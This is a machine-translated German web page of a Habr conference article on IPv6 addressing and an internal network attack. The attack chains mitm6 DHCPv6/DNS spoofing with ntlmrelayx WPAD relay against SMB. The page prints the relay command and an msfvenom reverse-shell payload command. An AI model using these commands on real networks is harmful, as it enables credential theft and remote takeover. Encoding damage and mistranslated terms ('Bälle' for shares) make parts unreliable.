<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üß† üîè üôçüèº Wo in IPv6 ein Anf√ºhrungszeichen eingef√ºgt werden soll üêó üôãüèæ üë©üèæ‚Äçüåæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="IPv6 ist eine neue Version des Internetprotokolls. IETF-Mitglieder haben es erst vor 22 Jahren, 1996, akzeptiert. W√§hrend dieser Zeit konnten bestimmt...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Wo in IPv6 ein Anf√ºhrungszeichen eingef√ºgt werden soll</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pm/blog/417285/"> IPv6 ist eine neue Version des Internetprotokolls.  IETF-Mitglieder haben es erst vor 22 Jahren, 1996, akzeptiert.  W√§hrend dieser Zeit konnten bestimmte IPv6-Angriffe auftreten.  Der Zweck dieses Artikels, der auf unserer Pr√§sentation an <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PHDays 8</a> basiert <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">,</a> besteht darin, die M√∂glichkeiten eines Angriffs eines internen Eindringlings auf Unternehmensnetzwerke mithilfe von IPv4 und IPv6 <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">aufzuzeigen</a> . <br><br><img src="https://habrastorage.org/webt/ls/nb/b7/lsnbb7p7odub6aicoy6uylbvcak.png"><br><a name="habracut"></a><br><h2>  Grundlagen der IPv6-Adressierung </h2><br>  Die L√§nge der IPv6-Adresse betr√§gt 128 Bit, die im Hexadezimalformat geschrieben werden, wobei die gesamte Adresse in 8 Gruppen unterteilt wird.  Ein Beispiel f√ºr das Schreiben einer IPv6-Adresse: <br><br>  2001: 0a00: cafe: babe: 0001: 0000: 0000: 0011/64 <br><br>  Es gibt einen vereinfachten Adressdatensatz, wenn mehrere nachfolgende Nullengruppen durch "::" ersetzt werden k√∂nnen, jedoch nur einmal.  In jeder Gruppe links geschriebene Nullen k√∂nnen verworfen werden.  Die obige Adresse kann also wie folgt geschrieben werden: <br><br>  2001: a00: cafe: babe: 1 :: 11/64 <br><br>  Die Standardgr√∂√üe des vom Anbieter an den Client ausgegebenen Host-Teils betr√§gt 64 Bit, von denen 4 zum Segmentieren des Netzwerks in Subnetze verwendet werden. <br><br><img src="https://habrastorage.org/webt/ae/0r/2b/ae0r2bmvkfpwm8bvbwdlui_560i.png"><br><br>  In IPv6 gibt es verschiedene Arten von Adressen: <br><br><img src="https://habrastorage.org/webt/cr/e2/zz/cre2zzzair09k_qyg-ozm_olyno.png"><br>  <b>Globales Unicast</b> ist ein Analogon zu √∂ffentlichen Adressen in IPv4.  Diese Adressen werden von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">IANA vergeben</a> und sind im gesamten Internet eindeutig.  Diese Adressen liegen im Bereich 2000 :: / 3 (2000 - 3FFF). <br><br>  <b>Lokale Adressen (Link-local)</b> - Adressen im Bereich FE80 :: / 10 (FE80 - FEBF) werden automatisch von Ger√§ten generiert und zur Interaktion mit anderen Ger√§ten im selben lokalen Netzwerk verwendet.  Datenverkehr, der diese Adresse als Absender oder Empf√§nger enth√§lt, sollte nicht weitergeleitet werden.  Somit kann ein Ger√§t, das IPv6 unterst√ºtzt und mit dem Netzwerk verbunden ist, ohne Konfiguration sofort Informationen innerhalb seines Subnetzes austauschen. <br><br>  <b>Loopback-Adresse :: 1</b> .  Diese Adresse √§hnelt 127.0.0.1 in IPv4.  An ihn gesendete Pakete verlassen das Ger√§t nicht. <br><br>  <b>Nicht spezifizierte Adresse</b> - die Adresse "::", die nur aus Nullen besteht.  Es wird in einigen F√§llen als Absender verwendet, bis die Adresse empfangen wird. <br><br>  <b>Eindeutige lokale Adressen (Unique local)</b> - ein Analogon zu privaten Adressen in IPv4, das innerhalb des internen Netzwerks des Unternehmens weitergeleitet werden kann, ohne dass eine Weiterleitung an das Internet m√∂glich ist.  Der IPv6-Adressraum ist so gro√ü, dass mehr als eine Billion Adressen an jede Person auf dem Planeten vergeben werden k√∂nnen und diese nicht enden werden.  Daher impliziert IPv6 die Aufgabe privater Adressen in dem Sinne, in dem sie in IPv4 verwendet wurden, weil √∂ffentliche Adressen fehlen. <br><br>  <b>IPv4-Adressen, die IPv6 zugeordnet sind (IPv4 eingebettet)</b> - IPv6-Adressen, die mit :: ffff beginnen: Die letzten 32 Bits enthalten eine IPv4-Adresse (:: ffff: xxxx: xxxx, wobei xxxx: xxxx die in hexadezimal konvertierte IPv4-Adresse ist).  Diese Adressen werden f√ºr Ger√§te verwendet, die IPv6 nicht unterst√ºtzen, und bieten eine M√∂glichkeit, einen IPv4-Adressraum einem IPv6-Adressraum zuzuordnen. <br><br>  <b>Multicast-Adressen (Multicast)</b> - eine der wichtigsten √Ñnderungen in IPv6 im Vergleich zu IPv4.  Das neue Protokoll lehnte Broadcast-Pakete ab, anstelle der Broadcast-Adresse werden Multicast-Adressen verwendet.  Alle diese Adressen liegen im Bereich FF00 :: / 8 <br><br><img src="https://habrastorage.org/webt/gw/io/c6/gwioc6toxuatii_wzugt5yb3j2w.png"><br><br><h3>  IPv6-Adresszuweisung </h3><br>  IPv6 verwendet das ICMPv6 Neighbor Discovery Protocol (ND), um Adressinformationen abzurufen.  Wie in der folgenden Abbildung gezeigt, sendet das Ger√§t beim Anzeigen eines neuen Ger√§ts im IPv6-Netzwerk eine Anforderung zum Abrufen einer IPv6-Adresse (Router Solicitation) an ‚Äûff02 :: 2‚Äú (alle Netzwerkrouter).  Der Router antwortet mit einer Nachricht (Router Advertisement), die Informationen zum Abrufen der IPv6-Adresse enth√§lt.  Abh√§ngig von den in der Nachricht gesetzten Flags gibt es drei M√∂glichkeiten: <br><table><tbody><tr><th>  Der Weg, um die Adresse zu bekommen </th><th>  Eine (Auto) Flagge </th><th>  O (Andere) Flagge </th><th>  M-Flagge (verwaltet) </th></tr><tr><td>  SLAAC (Standard) </td><td>  1 </td><td>  0 </td><td>  0 </td></tr><tr><td>  SLAAC + DHCPv6 </td><td>  1 </td><td>  1 </td><td>  0 </td></tr><tr><td>  DHCPv6 </td><td>  0 </td><td>  - - </td><td>  1 </td></tr></tbody></table><br>  <b>SLAAC</b> (Stateless Address Autoconfiguration) - In diesem Fall befindet sich alles, was zum Generieren einer globalen IPv6-Adresse erforderlich ist, in der RA-Nachricht. <br><br>  <b>SLAAC + DHCPv6</b> - Wie im Fall von SLAAC wird die Adresse basierend auf den Informationen im RA-Paket generiert, aber das O-Flag wird zus√§tzlich gesetzt, was bedeutet, dass eine andere Konfiguration vorliegt, und das Ger√§t muss den DHCPv6-Server kontaktieren, um zus√§tzliche Einstellungen zu erhalten, z. B. den DNS-Server. <br><br>  <b>DHCPv6</b> ist ein Analogon zur DHCPv4-Adresse, und alle anderen Informationen werden vom DHCP-Server ausgegeben, mit Ausnahme des Standard-Gateways, das der Absenderadresse des RA-Pakets entnommen wird. <br><br>  Wenn O- und M-Flags gleichzeitig gesetzt werden, wird das O-Flag ignoriert. <br><br><img src="https://habrastorage.org/webt/qx/nh/yw/qxnhywmpu6bpogmnss7c0emprpa.jpeg"><br>  Nehmen Sie als Beispiel das Dienstprogramm fake_router26 aus der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Dienstprogramm-Suite thc-ipv6</a> .  Das Bild zeigt, dass nach dem Start die IPv6-Adresse des Standard-Gateways hinzugef√ºgt wurde, die Vorrang vor IPv4 hatte. <br><br><img src="https://habrastorage.org/webt/mr/qc/45/mrqc45-7fxz_clcr6affsl69i9e.png"><br><br><h2>  Angriff! </h2><br>  In diesem Szenario wird die M√∂glichkeit eines Man-in-the-Middle-Angriffs unter Verwendung des Mechanismus zum Abrufen von IPv6-Netzwerkeinstellungen in Betracht gezogen. <br><br>  Zur Demonstration ben√∂tigen wir 4 Autos: <br><br>  <b>Der Angreifer ist</b> Kali Linux. <br><br><img src="https://habrastorage.org/webt/2z/rj/2p/2zrj2parlezr5m5thp1abcskgxo.png"><br><br>  <b>Der Server,</b> auf dem die Windows 7-Administratorb√§lle eingeschaltet werden. <br><br><img src="https://habrastorage.org/webt/tl/n3/qj/tln3qjafwp_zhancgxbpogpd5u4.png"><br><br>  <b>Ein Clientcomputer</b> , der Zugriff auf einen Windows 7-Server hat. <br><br><img src="https://habrastorage.org/webt/ob/vb/82/obvb82baad3u7bd4cmjlm-54atc.png"><br><br>  Ein Router mit aktiviertem DHCPv4. <br><br>  dirkjanm beschrieb die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Methodik f√ºr</a> dieses Szenario.  Er schrieb das Dienstprogramm mitm6, das mithilfe des ND-Protokolls Router Advertisment-Nachrichten mit den Flags ‚ÄûO‚Äú und ‚ÄûM‚Äú auf ‚Äû1‚Äú sendet.  Daher wissen Clients, dass Adressinformationen von einem DHCPv6-Server angefordert werden m√ºssen.  Clients senden DHCPv6-SOLICIT-Nachrichten, um den DHCP-Server zu ermitteln.  Das Dienstprogramm antwortet auf Anforderungen mit DHCPv6 ADVERTISE-Nachrichten.  Die Antwort enth√§lt die Adresse des angreifenden Computers als DNS-Server. <br><br><img alt="Anforderung von Adressinformationen, die an die Multicast-Adresse aller DHCP-Server ff02 :: 1: 2 gesendet werden" src="https://habrastorage.org/webt/ze/if/di/zeifdiuqvmjxgmsakw5nz5dqqau.png"><br><br>  Danach wird DHCPv6-DNS aufgrund der Architekturmerkmale des Betriebssystems zu einer Priorit√§t.  Jetzt kann der Angreifer auf alle DNS-Anfragen mit der richtigen Adresse antworten.  Daher wird die vom Domainnamen gesendete Anfrage nach Ermessen des Angreifers gesendet. <br><br>  Durch Ausf√ºhren von mitm6 k√∂nnen Sie die Dom√§ne angeben, f√ºr die DNS-Adressen ersetzt werden sollen. <br><br><img src="https://habrastorage.org/webt/cj/b5/mt/cjb5mthduecqu62-iig9ed9u24w.png"><br><br><img src="https://habrastorage.org/webt/ox/bz/bu/oxbzbuxhk777trjsfvr4idkkgdw.png"><br><br><h2>  Admin B√§lle </h2><br>  Angenommen, es gibt einen anderen Computer im Netzwerk, auf dem der Benutzer des ersten Computers eine Verbindung zu Verwaltungsb√§llen herstellen darf, um den dramatischen Effekt zu verst√§rken.  Standardm√§√üig sind sie deaktiviert, aber im Internet sind viele Leute daran interessiert, wie sie aktiviert werden sollen, und sie sind sehr gl√ºcklich, wenn sie es bekommen. <br><br><img src="https://habrastorage.org/webt/gi/yj/qt/giyjqt4gwprslmxgsgc_i2b_5_k.jpeg"><br><br><img src="https://habrastorage.org/webt/d-/gg/mp/d-ggmpf_b9oztu5dfrotewmbw9o.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">WPAD</a> (Web Proxy Auto Discovery) ist ein Protokoll zum Bestimmen des Speicherorts der Datei, in der sich die Standard-Proxy-Einstellungen befinden. <br><br>  Nach dem Update von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">MS16-077 wird</a> wpad nicht mehr √ºber NETBIOS bereitgestellt und auf dem Proxyserver nicht automatisch authentifiziert. <br><br>  Um diese Einschr√§nkungen zu umgehen, k√∂nnen Sie ntlmrelayx.py verwenden, das Teil von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">impacket ist</a> .  Es ist eine Version h√∂her als 0.9.16 erforderlich, die IPv6-Unterst√ºtzung und die M√∂glichkeit umfasst, einen Server zu installieren, der g√ºltiges wpad rendert.  Der Start erfolgt durch das Team <br><br><pre><code class="bash hljs">ntlmrelayx.py -6 -wh at.localdomain -t smb://192.168.56.7 -e 1.exe</code> </pre> <br>  Dabei ist 1.exe die vom Metasplit erzeugte Reverse-Shell-Nutzlast. <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.6 LPORT=444 -f exe -o 1.exe</code> </pre> <br>  Der Parameter -wh gibt den Host an, auf dem sich die wpad-Datei befindet (das Dienstprogramm mitm6 antwortet mit der Adresse des Angreifers auf diese Anforderung). <br><br><img src="https://habrastorage.org/webt/4e/ew/hh/4eewhhpvwjynispsnazoyftxtus.png"><br><br><img src="https://habrastorage.org/webt/p1/it/aa/p1itaa9idtzcavemj45sgzsbeeq.png"><br><br>  Nach dem Herstellen der Verbindung wird die HTTP 407-Authentifizierung (Proxy-Authentifizierung erforderlich) angefordert, bei der der Browser automatisch authentifiziert wird. <br><br><img src="https://habrastorage.org/webt/fw/hn/qz/fwhnqzgqri-snconlo2sdpubcmc.png"><br><br><img src="https://habrastorage.org/webt/f5/hf/1x/f5hf1xuyeourcueod8v70dqilsa.png"><br><br>  Die empfangenen Daten werden verwendet, um eine Verbindung zum smb des angegriffenen Servers herzustellen, der √ºber den Parameter -t √ºbergeben wird. <br><br><img src="https://habrastorage.org/webt/xa/hu/0e/xahu0errtgiiuzu9j_b1990pryq.png"><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WO2jeo85Mpg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  Ich danke meinem Co-Autor Sergey Ovchinnikov <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">malchikserega</a> f√ºr die Hilfe bei der Vorbereitung der Pr√§sentation und des Artikels. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de417285/">https://habr.com/ru/post/de417285/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de417271/index.html">Kann ein Hacker den √Ñrmelkanal blockieren?</a></li>
<li><a href="../de417273/index.html">Realisierung eines Voice Guides basierend auf YandexSpeechKit</a></li>
<li><a href="../de417275/index.html">7 F√§higkeiten effektiver Designer. Leistungsstarke Tools zur Karriereentwicklung</a></li>
<li><a href="../de417277/index.html">Kostenlose Bibliotheken zum Erstellen und Bearbeiten von PDF-Dateien</a></li>
<li><a href="../de417283/index.html">Disney stellte sein eigenes HairControl-Haaranimationssystem vor</a></li>
<li><a href="../de417287/index.html">"Testerkalender" f√ºr Juli. Analytics-Tests</a></li>
<li><a href="../de417289/index.html">Trainee-Tagebuch: Tag 1. Trainee bis Junior</a></li>
<li><a href="../de417293/index.html">Kennwortwiederherstellung und Prim√§rspeicherung in der Cloud oder Neue Funktionen in Zimbra 8.8.9</a></li>
<li><a href="../de417295/index.html">Wie habe ich die Standard-C ++ 11-Bibliothek geschrieben oder warum ist Boost so be√§ngstigend? Kapitel 3</a></li>
<li><a href="../de417297/index.html">Angst und Abscheu vor Bedrohungsintelligenz oder 8 TI-Tipps</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>